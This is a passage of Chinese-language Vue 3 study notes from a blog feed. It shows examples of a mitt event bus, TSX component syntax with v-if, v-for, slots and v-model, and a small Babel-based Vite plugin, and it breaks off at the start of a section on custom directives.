<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;a&quot;&gt;</span><br><span class="line">    &lt;h1&gt;A组件&lt;/h1&gt;</span><br><span class="line">    &lt;button @click=&quot;emitB&quot;&gt;派发一个事件&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import Bus from &quot;../bus&quot;</span><br><span class="line">let flag = false</span><br><span class="line"></span><br><span class="line">const emitB = ()=&gt; &#123;</span><br><span class="line">  flag = !flag</span><br><span class="line">  Bus.emit(&quot;on-click&quot;,flag)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.a &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: cyan;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>B.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;b&quot;&gt;</span><br><span class="line">    &lt;h1&gt;B组件&lt;/h1&gt;</span><br><span class="line">    &#123;&#123; flag &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line">import Bus from &quot;../bus&quot;</span><br><span class="line"></span><br><span class="line">let flag = ref(false)</span><br><span class="line">Bus.on(&quot;on-click&quot;, (f:boolean)=&gt;&#123;</span><br><span class="line">  flag.value = f</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.b &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: orange;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Mitt"><a href="#Mitt" class="headerlink" title="Mitt"></a>Mitt</h1><p>在Vue2中常用全局事件总线，但Vue3中<code>$on</code>、<code>$off</code>和<code>$once</code>实例方法都已被删除，组件实例不再实现事件触发接口，因此就不能像Vue2一样使用全局事件总线了。</p>
<p>作为替代，可以使用Mitt库（就是发布订阅模式）</p>
<p>在main.ts中将Mitt挂载到全局：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 其他的省略</span></span><br><span class="line"><span class="keyword">import</span> mitt <span class="keyword">from</span> <span class="string">&quot;mitt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Mit</span> = <span class="title function_">mitt</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// typescript注册</span></span><br><span class="line"><span class="comment">// 必须要拓展ComponentCustomProperties类型才能获得类型提示</span></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&quot;vue&quot;</span> &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">ComponentCustomProperties</span> &#123;</span><br><span class="line">    <span class="attr">$Bus</span>: <span class="keyword">typeof</span> <span class="title class_">Mit</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Vue3 挂载全局API</span></span><br><span class="line">app.<span class="property">config</span>.<span class="property">globalProperties</span>.<span class="property">$Bus</span> = <span class="title class_">Mit</span></span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;A&gt;&lt;/A&gt;</span><br><span class="line">    &lt;B&gt;&lt;/B&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import A from &quot;@/components/A.vue&quot;</span><br><span class="line">import B from &quot;@/components/B.vue&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>A.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;a&quot;&gt;</span><br><span class="line">    &lt;h1&gt;A组件&lt;/h1&gt;</span><br><span class="line">    &lt;button @click=&quot;emitB&quot;&gt;派发一个事件&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; getCurrentInstance &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">// 获取当前组件的实例</span><br><span class="line">const instance = getCurrentInstance()</span><br><span class="line"></span><br><span class="line">let flag = false</span><br><span class="line"></span><br><span class="line">const emitB = ()=&gt; &#123;</span><br><span class="line">  flag = !flag</span><br><span class="line">  instance?.proxy?.$Bus.emit(&quot;on-click&quot;,flag)</span><br><span class="line">  instance?.proxy?.$Bus.emit(&quot;on-str&quot;,&quot;strstr&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.a &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: cyan;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>B.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;b&quot;&gt;</span><br><span class="line">    &lt;h1&gt;B组件&lt;/h1&gt;</span><br><span class="line">    &lt;button @click=&quot;cancelFlag&quot;&gt;取消监听flag&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;cancelAll&quot;&gt;取消所有事件&lt;/button&gt;</span><br><span class="line">    &#123;&#123; flag &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, getCurrentInstance &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">const instance = getCurrentInstance()</span><br><span class="line"></span><br><span class="line">const cb = (f: unknown)=&gt;&#123;</span><br><span class="line">  flag.value = f as boolean</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let flag = ref(false)</span><br><span class="line">// 监听on-click flag变化的事件</span><br><span class="line">instance?.proxy?.$Bus.on(&quot;on-click&quot;, cb)</span><br><span class="line"></span><br><span class="line">// *表示监听所有的事件触发</span><br><span class="line">instance?.proxy?.$Bus.on(&quot;*&quot;, (type, arg)=&gt;&#123;</span><br><span class="line">  // type：事件名称 其他参数：事件传参</span><br><span class="line">  console.log(type,arg)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 取消on-click flag的事件</span><br><span class="line">const cancelFlag = ()=&gt; &#123;</span><br><span class="line">  // 参数1：取消的事件名 参数2：取消的回调函数</span><br><span class="line">  instance?.proxy?.$Bus.off(&quot;on-click&quot;, cb)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 取消所有事件</span><br><span class="line">const cancelAll = ()=&gt; &#123;</span><br><span class="line">  instance?.proxy?.$Bus.all.clear()</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.b &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  background-color: orange;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>也可以通过引入mitt使用。</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>TSX</title>
    <url>/web/study/Vue/25.TSX.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Vue3提供TSX支持"><a href="#Vue3提供TSX支持" class="headerlink" title="Vue3提供TSX支持"></a>Vue3提供TSX支持</h1><p>Vue中常用Template写模板，但也可以使用tsx。</p>
<p>Vue2就已经支持jsx写法，但友好度不高。因为Vue3对TypeScript的支持度高，所以tsx写法越来越被接受。</p>
<p>使用前需要安装<code>@vitejs/plugin-vue-jsx</code>插件。</p>
<p>安装完后在vite.config.ts引入：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> vueJsx <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-vue-jsx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="title function_">vueJsx</span>(),</span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="comment">// ...省略</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="使用TSX"><a href="#使用TSX" class="headerlink" title="使用TSX"></a>使用TSX</h1><p>创建一个App.tsx文件并使用：</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineComponent &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式1：返回一个渲染函数</span></span><br><span class="line"><span class="comment">// export default function() &#123;</span></span><br><span class="line"><span class="comment">//   const code = 114514</span></span><br><span class="line"><span class="comment">//   return (&lt;div&gt;&#123;code&#125;&lt;/div&gt;)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式2：使用defineComponent + Options API</span></span><br><span class="line"><span class="comment">// export default defineComponent(&#123;</span></span><br><span class="line"><span class="comment">//   data() &#123;</span></span><br><span class="line"><span class="comment">//     return &#123;</span></span><br><span class="line"><span class="comment">//       age:24,</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//   &#125;,</span></span><br><span class="line"><span class="comment">//   render() &#123;</span></span><br><span class="line"><span class="comment">//     return (&lt;div&gt;&#123;this.age&#125;岁，是学生&lt;/div&gt;)</span></span><br><span class="line"><span class="comment">//   &#125;</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式3：使用defineComponent + setup函数模式</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> name = <span class="string">&quot;野兽先辈&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function">()=&gt;</span> (<span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>直接引入，可以类似组件一样使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;ABC&gt;&lt;/ABC&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import ABC from &quot;./App&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="TSX和Vue语法"><a href="#TSX和Vue语法" class="headerlink" title="TSX和Vue语法"></a>TSX和Vue语法</h1><h2 id="ref响应式和v-show"><a href="#ref响应式和v-show" class="headerlink" title="ref响应式和v-show"></a>ref响应式和v-show</h2><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> name = <span class="string">&quot;野兽先辈&quot;</span></span><br><span class="line">    <span class="keyword">const</span> flag = <span class="title function_">ref</span>(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ref在template中会自动解包，但在tsx中不会，需要加上.value</span></span><br><span class="line">    <span class="comment">// tsx中可以直接使用v-show</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function">()=&gt;</span> (<span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-show</span>=<span class="string">&#123;flag.value&#125;</span>&gt;</span>&#123;name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h2><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> name = <span class="string">&quot;野兽先辈&quot;</span></span><br><span class="line">    <span class="keyword">const</span> flag = <span class="title function_">ref</span>(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tsx中不支持v-if，用了就报错</span></span><br><span class="line">    <span class="comment">// return ()=&gt; (&lt;div v-if=&#123;flag.value&#125;&gt;&#123;name&#125;&lt;/div&gt;)</span></span><br><span class="line">    <span class="comment">// 真的要用的话就利用编程思想（三元表达式代替v-if）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function">()=&gt;</span> (<span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;flag.value? <span class="tag">&lt;<span class="name">div</span>&gt;</span>true<span class="tag">&lt;/<span class="name">div</span>&gt;</span>: &quot;&quot;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="v-for和v-bind"><a href="#v-for和v-bind" class="headerlink" title="v-for和v-bind"></a>v-for和v-bind</h2><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> data = [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;KNN&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;SNNN&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;YJSP&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;RU&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;BNKRG&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;SIK&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">    <span class="comment">// tsx也不能使用v-for，也要用编程思想（Array.map代替v-for）</span></span><br><span class="line">    <span class="comment">// 使用v-bind时可以直接写属性名并传值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function">()=&gt;</span> (<span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;data.map(v=&gt; &#123;</span></span><br><span class="line"><span class="language-xml">        return<span class="tag">&lt;<span class="name">div</span> <span class="attr">name</span>=<span class="string">&#123;v.name&#125;</span>&gt;</span>&#123;v.name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#125;)&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="props和emits"><a href="#props和emits" class="headerlink" title="props和emits"></a>props和emits</h2><p>App.tsx：</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Props</span> &#123;</span><br><span class="line">  name?: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="title class_">String</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">emits</span>: [<span class="string">&quot;on-click&quot;</span>],</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params">props:Props,&#123;emit&#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> data = [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;KNN&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;SNNN&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;YJSP&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;RU&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;BNKRG&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;SIK&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">click</span> = (<span class="params">item:<span class="built_in">any</span></span>)=&gt; &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;click&quot;</span>,item)</span><br><span class="line">      <span class="title function_">emit</span>(<span class="string">&quot;on-click&quot;</span>,item)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">()=&gt;</span> (<span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>props：&#123;props?.name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;data.map(v=&gt; &#123;</span></span><br><span class="line"><span class="language-xml">        // 函数柯里化</span></span><br><span class="line"><span class="language-xml">        return<span class="tag">&lt;<span class="name">div</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span>=&gt;</span>click(v)&#125;&gt;&#123;v.name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#125;)&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;ABC name=&quot;yajue&quot; @on-click=&quot;click2&quot;&gt;&lt;/ABC&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import ABC from &quot;./App&quot;</span><br><span class="line"></span><br><span class="line">const click2 = (item:any)=&gt; &#123;</span><br><span class="line">  console.log(&quot;click2&quot;,item)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h2><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 渲染函数，作为提供插槽的子组件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">A</span> = (<span class="params">_:<span class="built_in">any</span>,&#123;slots&#125;:<span class="built_in">any</span></span>)=&gt; (<span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;slots.default? slots.default(): &quot;默认值&quot;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;slots.foo?.()&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/&gt;</span></span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 使用对象定义插入插槽的内容</span></span><br><span class="line">    <span class="keyword">const</span> slot = &#123;</span><br><span class="line">      <span class="attr">default</span>: <span class="function">()=&gt;</span> (<span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>default slots<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>),</span><br><span class="line">      <span class="attr">foo</span>: <span class="function">()=&gt;</span> (<span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>foo slots<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">()=&gt;</span> (<span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">A</span> <span class="attr">v-slots</span>=<span class="string">&#123;slot&#125;</span>&gt;</span><span class="tag">&lt;/<span class="name">A</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h2><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineComponent</span>(&#123;</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> v = ref&lt;<span class="built_in">string</span>&gt;(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment">// v-model可以直接用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function">()=&gt;</span> (<span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">&#123;v.value&#125;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;v.value&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="Vite插件制作"><a href="#Vite插件制作" class="headerlink" title="Vite插件制作"></a>Vite插件制作</h1><p>用到的库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install @vue/babel-plugin-jsx</span><br><span class="line">npm install @babel/core</span><br><span class="line">npm install @babel/plugin-transform-typescript</span><br><span class="line">npm install @babel/plugin-syntax-import-meta</span><br><span class="line">npm install @types/babel__core</span><br></pre></td></tr></table></figure>

<p>Babel常用于语法转换，比如把ES6语法转换为ES5，提高低版本浏览器的兼容性。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305242012808.png" alt="编译原理"></p>
<p>在项目根目录新建plugin&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vite插件制作方式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">Plugin</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vite&quot;</span></span><br><span class="line"><span class="comment">// @babel/core 核心功能，将源代码转换成目标代码</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> babel <span class="keyword">from</span> <span class="string">&quot;@babel/core&quot;</span></span><br><span class="line"><span class="comment">// Vue给babel写的插件 支持tsx v-model等</span></span><br><span class="line"><span class="keyword">import</span> jsx <span class="keyword">from</span> <span class="string">&quot;@vue/babel-plugin-jsx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params"></span>): <span class="title class_">Plugin</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;vite-plugin-vue-tsx&quot;</span>,</span><br><span class="line">    <span class="comment">// 把代码(code)和路径(id)返回成这个函数的参数</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">transform</span>(<span class="params">code, id</span>) &#123;</span><br><span class="line">      <span class="comment">// 匹配文件类型</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="regexp">/.tsx$/</span>.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">        <span class="comment">// @ts-ignore</span></span><br><span class="line">        <span class="keyword">const</span> ts = <span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">&quot;@babel/plugin-transform-typescript&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="property">default</span>)</span><br><span class="line">        <span class="keyword">const</span> res = <span class="keyword">await</span> babel.<span class="title function_">transformAsync</span>(code,&#123;</span><br><span class="line">          <span class="comment">// ast：抽象语法树，源代码语法结构的一种抽象表示</span></span><br><span class="line">          <span class="attr">ast</span>:<span class="literal">true</span>,</span><br><span class="line">          <span class="comment">// 默认搜索默认babel.config.json文件</span></span><br><span class="line">          <span class="attr">configFile</span>:<span class="literal">false</span>,</span><br><span class="line">          <span class="comment">// .babelrc.json</span></span><br><span class="line">          <span class="attr">babelrc</span>:<span class="literal">false</span>,</span><br><span class="line">          <span class="comment">// 添加babel插件</span></span><br><span class="line">          <span class="attr">plugins</span>:[jsx,[ts,&#123;<span class="attr">isTSX</span>:<span class="literal">true</span>,<span class="attr">allowExtensions</span>:<span class="literal">true</span>&#125;]]</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> res?.<span class="property">code</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> code</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时在tsconfig的include中加入该路径，就可以作为插件使用了。</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义指令directive</title>
    <url>/web/study/Vue/27.%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4directive.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="自定义指令"><a href="#自定义指令" class="headerlink" title="自定义指令"></a>自定义指令</h1><h2 id="生命周期钩子"><a href="#生命周期钩子" class="headerlink" title="生命周期钩子"></a>生命周期钩子</h2><p>Vue3自定义指令有这些生命周期钩子函数：</p>
<ul>
<li>created：元素初始化时</li>
<li>beforeMount：指令绑定到元素后调用，只调用一次</li>
<li>mounted：元素插入父级dom调用</li>
<li>beforeUpdate：元素被更新前调用</li>
<li>update：元素被更新后调用</li>
<li>beforeUnmount：在元素被移除前调用</li>
<li>unmounted：指令被移除后调用，只调用一次</li>
</ul>
<blockquote>
<p>Vue2的指令：bind、inserted、update、componentUpdated、unbind</p>
</blockquote>
<p>App.vue：</p>
